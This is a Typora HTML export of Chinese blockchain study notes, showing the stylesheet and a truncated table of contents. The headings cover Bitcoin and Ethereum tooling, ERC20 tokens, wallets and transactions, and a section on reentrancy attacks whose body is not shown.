<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
<title>block_chain</title><link href='https://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext' rel='stylesheet' type='text/css' /><style type='text/css'>html {overflow-x: initial !important;}:root { --bg-color:#ffffff; --text-color:#333333; --select-text-bg-color:#B5D6FC; --select-text-font-color:auto; }
html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
body { margin: 0px; padding: 0px; height: auto; bottom: 0px; top: 0px; left: 0px; right: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; }
a.url { word-break: break-all; }
a:active, a:hover { outline: 0px; }
.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }
#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; word-wrap: break-word; position: relative; padding-bottom: 70px; white-space: pre-wrap; overflow-x: visible; }
.first-line-indent #write p .md-line { text-indent: 0px; }
.first-line-indent #write li, .first-line-indent #write p, .first-line-indent #write p .md-line:first-child { text-indent: 2em; }
.for-image #write { padding-left: 8px; padding-right: 8px; }
body.typora-export { padding-left: 30px; padding-right: 30px; }
@media screen and (max-width: 500px) {
  body.typora-export { padding-left: 0px; padding-right: 0px; }
  .CodeMirror-sizer { margin-left: 0px !important; }
  .CodeMirror-gutters { display: none !important; }
}
#write > blockquote:first-child, #write > div:first-child, #write > figure:first-child, #write > ol:first-child, #write > p:first-child, #write > pre:first-child, #write > ul:first-child { margin-top: 30px; }
#write li > figure:first-child { margin-top: -20px; }
#write ol, #write ul { position: relative; }
img { max-width: 100%; vertical-align: middle; }
button, input, select, textarea { color: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; }
input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }
*, ::after, ::before { box-sizing: border-box; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p { position: relative; }
h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 2; }
p { orphans: 4; }
h1 { font-size: 2rem; }
h2 { font-size: 1.8rem; }
h3 { font-size: 1.6rem; }
h4 { font-size: 1.4rem; }
h5 { font-size: 1.2rem; }
h6 { font-size: 1rem; }
h1, h2, h3, h4, h5, h6 { margin-top: 1rem; margin-bottom: 1rem; }
p { -webkit-margin-before: 1rem; -webkit-margin-after: 1rem; -webkit-margin-start: 0px; -webkit-margin-end: 0px; }
.mathjax-block { margin-top: 0px; margin-bottom: 0px; -webkit-margin-before: 0px; -webkit-margin-after: 0px; }
.hidden { display: none; }
.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }
a { cursor: pointer; }
sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }
sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }
#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }
figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }
figure > table { margin: 0px !important; }
tr { break-inside: avoid; break-after: auto; }
thead { display: table-header-group; }
table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }
table.md-table td { min-width: 80px; }
.CodeMirror-gutters { border-right: 0px; background-color: inherit; }
.CodeMirror { text-align: left; }
.CodeMirror-placeholder { opacity: 0.3; }
.CodeMirror pre { padding: 0px 4px; }
.CodeMirror-lines { padding: 0px; }
div.hr:focus { cursor: none; }
pre { white-space: pre-wrap; }
pre.contain-cm { white-space: normal; }
.CodeMirror-gutters { margin-right: 4px; }
.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }
.md-diagram-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }
.md-fences.mock-cm { white-space: pre-wrap; }
.show-fences-line-number .md-fences { padding-left: 0px; }
.show-fences-line-number .md-fences.mock-cm { padding-left: 40px; }
.CodeMirror-line { break-inside: avoid; }
.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }
.footnotes + .footnotes { margin-top: 0px; }
.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }
li div { padding-top: 0px; }
blockquote { margin: 1rem 0px; }
li .mathjax-block, li p { margin: 0.5rem 0px; }
li { margin: 0px; position: relative; }
blockquote > :last-child { margin-bottom: 0px; }
blockquote > :first-child, li > :first-child { margin-top: 0px; }
.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }
.footnote-line { white-space: pre-wrap; }
@media print {
  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; }
  #write { margin-top: 0px; border-color: transparent !important; }
  .typora-export * { -webkit-print-color-adjust: exact; }
  html.blink-to-pdf { font-size: 13px; }
  .typora-export #write { padding-left: 1cm; padding-right: 1cm; padding-bottom: 0px; break-after: avoid; }
  .typora-export #write::after { height: 0px; }
  @page { margin: 20mm 0px; }
}
.footnote-line { margin-top: 0.714em; font-size: 0.7em; }
a img, img a { cursor: pointer; }
pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }
p > img:only-child { display: block; margin: auto; }
.md-line > .md-image:only-child, p > .md-image:only-child { display: inline-block; width: 100%; text-align: center; }
#write .MathJax_Display { margin: 0.8em 0px 0px; }
.mathjax-block { white-space: pre; overflow: hidden; width: 100%; }
p + .mathjax-block { margin-top: -1.143rem; }
.mathjax-block:not(:empty)::after { display: none; }
[contenteditable="true"]:active, [contenteditable="true"]:focus { outline: 0px; box-shadow: none; }
.md-task-list-item { position: relative; list-style-type: none; }
.task-list-item.md-task-list-item { padding-left: 0px; }
.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); }
.math { font-size: 1rem; }
.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }
.md-toc-content { position: relative; margin-left: 0px; }
.md-toc-content::after, .md-toc::after { display: none; }
.md-toc-item { display: block; color: rgb(65, 131, 196); }
.md-toc-item a { text-decoration: none; }
.md-toc-inner:hover { }
.md-toc-inner { display: inline-block; cursor: pointer; }
.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }
.md-toc-h2 .md-toc-inner { margin-left: 2em; }
.md-toc-h3 .md-toc-inner { margin-left: 4em; }
.md-toc-h4 .md-toc-inner { margin-left: 6em; }
.md-toc-h5 .md-toc-inner { margin-left: 8em; }
.md-toc-h6 .md-toc-inner { margin-left: 10em; }
@media screen and (max-width: 48em) {
  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }
  .md-toc-h4 .md-toc-inner { margin-left: 5em; }
  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }
  .md-toc-h6 .md-toc-inner { margin-left: 8em; }
}
a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }
.footnote-line a:not(.reversefootnote) { color: inherit; }
.md-attr { display: none; }
.md-fn-count::after { content: "."; }
code, pre, tt { font-family: var(--monospace); }
.md-comment { color: rgb(162, 127, 3); opacity: 0.8; font-family: var(--monospace); }
code { text-align: left; }
a.md-print-anchor { border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }
.md-inline-math .MathJax_SVG .noError { display: none !important; }
.mathjax-block .MathJax_SVG_Display { text-align: center; margin: 1em 0px; position: relative; text-indent: 0px; max-width: none; max-height: none; min-height: 0px; min-width: 100%; width: auto; display: block !important; }
.MathJax_SVG_Display, .md-inline-math .MathJax_SVG_Display { width: auto; margin: inherit; display: inline-block !important; }
.MathJax_SVG .MJX-monospace { font-family: monospace; }
.MathJax_SVG .MJX-sans-serif { font-family: sans-serif; }
.MathJax_SVG { display: inline; font-style: normal; font-weight: 400; line-height: normal; zoom: 90%; text-indent: 0px; text-align: left; text-transform: none; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; direction: ltr; max-width: none; max-height: none; min-width: 0px; min-height: 0px; border: 0px; padding: 0px; margin: 0px; }
.MathJax_SVG * { transition: none; }
.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }
.md-diagram-panel > svg { max-width: 100%; }
[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; }
[lang="mermaid"] .node text { font-size: 1rem; }
table tr th { border-bottom: 0px; }


.CodeMirror { height: auto; }
.CodeMirror.cm-s-inner { background: inherit; }
.CodeMirror-scroll { overflow-y: hidden; overflow-x: auto; z-index: 3; }
.CodeMirror-lines { padding: 4px 0px; }
.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }
.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background: inherit; white-space: nowrap; }
.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }
.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }
.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }
.cm-s-inner .cm-number { color: rgb(17, 102, 68); }
.cm-s-inner .cm-def { color: rgb(0, 0, 255); }
.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }
.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }
.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }
.cm-s-inner .cm-string { color: rgb(170, 17, 17); }
.cm-s-inner .cm-property { color: rgb(0, 0, 0); }
.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }
.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }
.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }
.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }
.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }
.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }
.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }
.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }
.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }
.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }
.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }
.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }
.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }
.cm-negative { color: rgb(221, 68, 68); }
.cm-positive { color: rgb(34, 153, 34); }
.cm-header, .cm-strong { font-weight: 700; }
.cm-del { text-decoration: line-through; }
.cm-em { font-style: italic; }
.cm-link { text-decoration: underline; }
.cm-error { color: red; }
.cm-invalidchar { color: red; }
.cm-constant { color: rgb(38, 139, 210); }
.cm-defined { color: rgb(181, 137, 0); }
div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }
div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }
.cm-s-inner .CodeMirror-activeline-background { background: inherit; }
.CodeMirror { position: relative; overflow: hidden; }
.CodeMirror-scroll { margin-bottom: -30px; padding-bottom: 30px; height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }
.CodeMirror-sizer { position: relative; }
.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; }
.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }
.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow-y: hidden; overflow-x: scroll; }
.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }
.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }
.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 30px; z-index: 3; }
.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }
.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: none !important; }
.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }
.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }
.CodeMirror-lines { cursor: text; }
.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; word-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }
.CodeMirror-wrap pre { word-wrap: break-word; white-space: pre-wrap; word-break: normal; }
.CodeMirror-code pre { border-right: 30px solid transparent; width: fit-content; }
.CodeMirror-wrap .CodeMirror-code pre { border-right: none; width: auto; }
.CodeMirror-linebackground { position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 0; }
.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }
.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }
.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }
.CodeMirror-measure pre { position: static; }
.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right: none; width: 0px; }
.CodeMirror div.CodeMirror-cursor { visibility: hidden; }
.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }
.cm-searching { background: rgba(255, 255, 0, 0.4); }
@media print {
  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }
}
.CodeMirror-lint-markers { width: 16px; }
.CodeMirror-lint-tooltip { background-color: infobackground; border: 1px solid rgb(0, 0, 0); border-radius: 4px; color: infotext; font-family: var(--monospace); overflow: hidden; padding: 2px 5px; position: fixed; white-space: pre-wrap; z-index: 10000; max-width: 600px; opacity: 0; transition: opacity 0.4s; font-size: 0.8em; }
.CodeMirror-lint-mark-error, .CodeMirror-lint-mark-warning { background-position: left bottom; background-repeat: repeat-x; }
.CodeMirror-lint-mark-error { background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAYAAAC09K7GAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9sJDw4cOCW1/KIAAAAZdEVYdENvbW1lbnQAQ3JlYXRlZCB3aXRoIEdJTVBXgQ4XAAAAHElEQVQI12NggIL/DAz/GdA5/xkY/qPKMDAwAADLZwf5rvm+LQAAAABJRU5ErkJggg=="); }
.CodeMirror-lint-marker-error, .CodeMirror-lint-marker-warning { background-position: center center; background-repeat: no-repeat; cursor: pointer; display: inline-block; height: 16px; width: 16px; vertical-align: middle; position: relative; }
.CodeMirror-lint-message-error, .CodeMirror-lint-message-warning { padding-left: 18px; background-position: left top; background-repeat: no-repeat; }
.CodeMirror-lint-marker-error, .CodeMirror-lint-message-error { background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAHlBMVEW7AAC7AACxAAC7AAC7AAAAAAC4AAC5AAD///+7AAAUdclpAAAABnRSTlMXnORSiwCK0ZKSAAAATUlEQVR42mWPOQ7AQAgDuQLx/z8csYRmPRIFIwRGnosRrpamvkKi0FTIiMASR3hhKW+hAN6/tIWhu9PDWiTGNEkTtIOucA5Oyr9ckPgAWm0GPBog6v4AAAAASUVORK5CYII="); }
.CodeMirror-lint-marker-warning, .CodeMirror-lint-message-warning { background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAANlBMVEX/uwDvrwD/uwD/uwD/uwD/uwD/uwD/uwD/uwD6twD/uwAAAADurwD2tQD7uAD+ugAAAAD/uwDhmeTRAAAADHRSTlMJ8mN1EYcbmiixgACm7WbuAAAAVklEQVR42n3PUQqAIBBFUU1LLc3u/jdbOJoW1P08DA9Gba8+YWJ6gNJoNYIBzAA2chBth5kLmG9YUoG0NHAUwFXwO9LuBQL1giCQb8gC9Oro2vp5rncCIY8L8uEx5ZkAAAAASUVORK5CYII="); }
.CodeMirror-lint-marker-multiple { background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAHCAMAAADzjKfhAAAACVBMVEUAAAAAAAC/v7914kyHAAAAAXRSTlMAQObYZgAAACNJREFUeNo1ioEJAAAIwmz/H90iFFSGJgFMe3gaLZ0od+9/AQZ0ADosbYraAAAAAElFTkSuQmCC"); background-repeat: no-repeat; background-position: right bottom; width: 100%; height: 100%; }


:root { --side-bar-bg-color: #fafafa; --control-text-color: #777; }
@font-face { font-family: "Open Sans"; font-style: normal; font-weight: normal; src: local("Open Sans Regular"), url("./github/400.woff") format("woff"); }
@font-face { font-family: "Open Sans"; font-style: italic; font-weight: normal; src: local("Open Sans Italic"), url("./github/400i.woff") format("woff"); }
@font-face { font-family: "Open Sans"; font-style: normal; font-weight: bold; src: local("Open Sans Bold"), url("./github/700.woff") format("woff"); }
@font-face { font-family: "Open Sans"; font-style: italic; font-weight: bold; src: local("Open Sans Bold Italic"), url("./github/700i.woff") format("woff"); }
html { font-size: 16px; }
body { font-family: "Open Sans", "Clear Sans", "Helvetica Neue", Helvetica, Arial, sans-serif; color: rgb(51, 51, 51); line-height: 1.6; }
#write { max-width: 860px; margin: 0px auto; padding: 20px 30px 100px; }
#write > ul:first-child, #write > ol:first-child { margin-top: 30px; }
body > :first-child { margin-top: 0px !important; }
body > :last-child { margin-bottom: 0px !important; }
a { color: rgb(65, 131, 196); }
h1, h2, h3, h4, h5, h6 { position: relative; margin-top: 1rem; margin-bottom: 1rem; font-weight: bold; line-height: 1.4; cursor: text; }
h1:hover a.anchor, h2:hover a.anchor, h3:hover a.anchor, h4:hover a.anchor, h5:hover a.anchor, h6:hover a.anchor { text-decoration: none; }
h1 tt, h1 code { font-size: inherit; }
h2 tt, h2 code { font-size: inherit; }
h3 tt, h3 code { font-size: inherit; }
h4 tt, h4 code { font-size: inherit; }
h5 tt, h5 code { font-size: inherit; }
h6 tt, h6 code { font-size: inherit; }
h1 { padding-bottom: 0.3em; font-size: 2.25em; line-height: 1.2; border-bottom: 1px solid rgb(238, 238, 238); }
h2 { padding-bottom: 0.3em; font-size: 1.75em; line-height: 1.225; border-bottom: 1px solid rgb(238, 238, 238); }
h3 { font-size: 1.5em; line-height: 1.43; }
h4 { font-size: 1.25em; }
h5 { font-size: 1em; }
h6 { font-size: 1em; color: rgb(119, 119, 119); }
p, blockquote, ul, ol, dl, table { margin: 0.8em 0px; }
li > ol, li > ul { margin: 0px; }
hr { height: 2px; padding: 0px; margin: 16px 0px; background-color: rgb(231, 231, 231); border: 0px none; overflow: hidden; box-sizing: content-box; }
body > h2:first-child { margin-top: 0px; padding-top: 0px; }
body > h1:first-child { margin-top: 0px; padding-top: 0px; }
body > h1:first-child + h2 { margin-top: 0px; padding-top: 0px; }
body > h3:first-child, body > h4:first-child, body > h5:first-child, body > h6:first-child { margin-top: 0px; padding-top: 0px; }
a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 { margin-top: 0px; padding-top: 0px; }
h1 p, h2 p, h3 p, h4 p, h5 p, h6 p { margin-top: 0px; }
li p.first { display: inline-block; }
ul, ol { padding-left: 30px; }
ul:first-child, ol:first-child { margin-top: 0px; }
ul:last-child, ol:last-child { margin-bottom: 0px; }
blockquote { border-left: 4px solid rgb(223, 226, 229); padding: 0px 15px; color: rgb(119, 119, 119); }
blockquote blockquote { padding-right: 0px; }
table { padding: 0px; word-break: initial; }
table tr { border-top: 1px solid rgb(223, 226, 229); margin: 0px; padding: 0px; }
table tr:nth-child(2n), thead { background-color: rgb(248, 248, 248); }
table tr th { font-weight: bold; border-width: 1px 1px 0px; border-top-style: solid; border-right-style: solid; border-left-style: solid; border-top-color: rgb(223, 226, 229); border-right-color: rgb(223, 226, 229); border-left-color: rgb(223, 226, 229); border-image: initial; border-bottom-style: initial; border-bottom-color: initial; text-align: left; margin: 0px; padding: 6px 13px; }
table tr td { border: 1px solid rgb(223, 226, 229); text-align: left; margin: 0px; padding: 6px 13px; }
table tr th:first-child, table tr td:first-child { margin-top: 0px; }
table tr th:last-child, table tr td:last-child { margin-bottom: 0px; }
.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); }
.md-fences, code, tt { border: 1px solid rgb(223, 226, 229); background-color: rgb(248, 248, 248); border-radius: 3px; font-family: Consolas, "Liberation Mono", Courier, monospace; padding: 2px 4px 0px; font-size: 0.9em; }
.md-fences { margin-bottom: 15px; margin-top: 15px; padding: 8px 1em 6px; }
.md-task-list-item > input { margin-left: -1.3em; }
@media screen and (min-width: 914px) {
}
@media print {
  html { font-size: 13px; }
  table, pre { break-inside: avoid; }
  pre { word-wrap: break-word; }
}
.md-fences { background-color: rgb(248, 248, 248); }
#write pre.md-meta-block { padding: 1rem; font-size: 85%; line-height: 1.45; background-color: rgb(247, 247, 247); border: 0px; border-radius: 3px; color: rgb(119, 119, 119); margin-top: 0px !important; }
.mathjax-block > .code-tooltip { bottom: 0.375rem; }
#write > h3.md-focus::before { left: -1.5625rem; top: 0.375rem; }
#write > h4.md-focus::before { left: -1.5625rem; top: 0.285714rem; }
#write > h5.md-focus::before { left: -1.5625rem; top: 0.285714rem; }
#write > h6.md-focus::before { left: -1.5625rem; top: 0.285714rem; }
.md-image > .md-meta { border-radius: 3px; font-family: Consolas, "Liberation Mono", Courier, monospace; padding: 2px 0px 0px 4px; font-size: 0.9em; color: inherit; }
.md-tag { color: inherit; }
.md-toc { margin-top: 20px; padding-bottom: 20px; }
.sidebar-tabs { border-bottom: none; }
#typora-quick-open { border: 1px solid rgb(221, 221, 221); background-color: rgb(248, 248, 248); }
#typora-quick-open-item { background-color: rgb(250, 250, 250); border-color: rgb(254, 254, 254) rgb(229, 229, 229) rgb(229, 229, 229) rgb(238, 238, 238); border-style: solid; border-width: 1px; }
#md-notification::before { top: 10px; }
.on-focus-mode blockquote { border-left-color: rgba(85, 85, 85, 0.12); }
header, .context-menu, .megamenu-content, footer { font-family: "Segoe UI", Arial, sans-serif; }
.file-node-content:hover .file-node-icon, .file-node-content:hover .file-node-open-state { visibility: visible; }
.mac-seamless-mode #typora-sidebar { background-color: var(--side-bar-bg-color); }
.md-lang { color: rgb(180, 101, 77); }
.html-for-mac .context-menu { --item-hover-bg-color: #E6F0FE; }






</style>
</head>
<body class='typora-export os-windows' >
<div  id='write'  class = 'is-node'><div class='md-toc' mdtype='toc'><p class="md-toc-content"><span class="md-toc-item md-toc-h2" data-ref="n73"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n73">DIY</a></span><span class="md-toc-item md-toc-h3" data-ref="n74"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n74">比特币测试网络</a></span><span class="md-toc-item md-toc-h4" data-ref="n80"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n80">运行 bitcoind</a></span><span class="md-toc-item md-toc-h4" data-ref="n82"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n82">运行 bitcoin-cli</a></span><span class="md-toc-item md-toc-h3" data-ref="n116"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n116">以太坊初步探索</a></span><span class="md-toc-item md-toc-h4" data-ref="n126"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n126">启动 geth</a></span><span class="md-toc-item md-toc-h4" data-ref="n135"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n135">查看系统变量</a></span><span class="md-toc-item md-toc-h4" data-ref="n151"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n151">查看节点信息</a></span><span class="md-toc-item md-toc-h4" data-ref="n1634"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1634">账户操作</a></span><span class="md-toc-item md-toc-h4" data-ref="n199"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n199">合约</a></span><span class="md-toc-item md-toc-h3" data-ref="n257"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n257">以太坊 Web3.js 开发基础</a></span><span class="md-toc-item md-toc-h4" data-ref="n267"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n267">简介</a></span><span class="md-toc-item md-toc-h4" data-ref="n270"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n270">安装 testrpc</a></span><span class="md-toc-item md-toc-h4" data-ref="n280"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n280">启动 testrpc</a></span><span class="md-toc-item md-toc-h4" data-ref="n285"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n285">方式一：交互式操作</a></span><span class="md-toc-item md-toc-h4" data-ref="n304"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n304">方式二：运行 js 脚本</a></span><span class="md-toc-item md-toc-h3" data-ref="n315"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n315">以太坊 ERC20 Token</a></span><span class="md-toc-item md-toc-h4" data-ref="n318"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n318">编写合约</a></span><span class="md-toc-item md-toc-h5" data-ref="n319"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n319">接口函数</a></span><span class="md-toc-item md-toc-h5" data-ref="n339"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n339">事件函数</a></span><span class="md-toc-item md-toc-h4" data-ref="n353"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n353">在线编译</a></span><span class="md-toc-item md-toc-h4" data-ref="n358"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n358">部署合约</a></span><span class="md-toc-item md-toc-h4" data-ref="n371"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n371">执行合约</a></span><span class="md-toc-item md-toc-h4" data-ref="n384"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n384">在测试网络部署合约</a></span><span class="md-toc-item md-toc-h4" data-ref="n420"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n420">在测试网络一键发币</a></span><span class="md-toc-item md-toc-h3" data-ref="n437"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n437">以太坊智能合约攻击：重入</a></span><span class="md-toc-item md-toc-h4" data-ref="n438"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n438">公共钱包合约</a></span><span class="md-toc-item md-toc-h4" data-ref="n442"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n442">存在的问题</a></span><span class="md-toc-item md-toc-h4" data-ref="n484"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n484">攻击合约</a></span><span class="md-toc-item md-toc-h4" data-ref="n486"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n486">攻击原理</a></span><span class="md-toc-item md-toc-h4" data-ref="n505"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n505">攻击过程</a></span><span class="md-toc-item md-toc-h4" data-ref="n587"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n587">扩展</a></span><span class="md-toc-item md-toc-h2" data-ref="n597"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n597">比特币 bitcoin</a></span><span class="md-toc-item md-toc-h3" data-ref="n598"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n598">密钥和地址</a></span><span class="md-toc-item md-toc-h4" data-ref="n601"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n601">钱包地址的生成</a></span><span class="md-toc-item md-toc-h4" data-ref="n620"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n620">私钥、公钥、钱包地址</a></span><span class="md-toc-item md-toc-h4" data-ref="n625"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n625">使用『私钥』对交易进行签名</a></span><span class="md-toc-item md-toc-h4" data-ref="n640"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n640">使用『公钥』对签名进行验证</a></span><span class="md-toc-item md-toc-h4" data-ref="n645"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n645">结论</a></span><span class="md-toc-item md-toc-h3" data-ref="n655"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n655">钱包</a></span><span class="md-toc-item md-toc-h4" data-ref="n658"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n658">非确定性钱包</a></span><span class="md-toc-item md-toc-h4" data-ref="n661"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n661">确定性钱包</a></span><span class="md-toc-item md-toc-h3" data-ref="n664"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n664">交易</a></span><span class="md-toc-item md-toc-h4" data-ref="n671"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n671">交易的输入输出</a></span><span class="md-toc-item md-toc-h4" data-ref="n678"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n678">交易输出</a></span><span class="md-toc-item md-toc-h4" data-ref="n707"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n707">交易输入</a></span><span class="md-toc-item md-toc-h4" data-ref="n750"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n750">交易费</a></span><span class="md-toc-item md-toc-h4" data-ref="n757"><a class="md-toc-inner" 